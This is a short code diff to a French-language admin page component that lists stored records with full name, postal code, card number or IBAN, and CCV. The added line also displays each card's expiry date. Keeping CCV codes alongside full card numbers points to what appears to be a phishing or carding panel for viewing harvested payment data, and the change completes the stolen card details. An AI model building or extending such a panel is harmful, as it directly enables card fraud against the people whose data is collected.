@@ -338,6 +338,7 @@ function AdminPage() {
                         <div>Nom: {record.fullName || "-"}</div>
                         <div>Code postal: {record.postalCode || "-"}</div>
                         <div>Numero carte bancaire: {record.cardNumber || record.numeroCarteBancaire || record.iban || "-"}</div>
+                        <div>Date expiration carte: {record.cardExpiryDate || record.dateExpirationCarte || "-"}</div>
                         <div>CCV: {record.ccv || "-"}</div>
                         <div>Details: {record.details || "-"}</div>
                         <div>Cree le: {formatDate(record.createdAt)}</div>
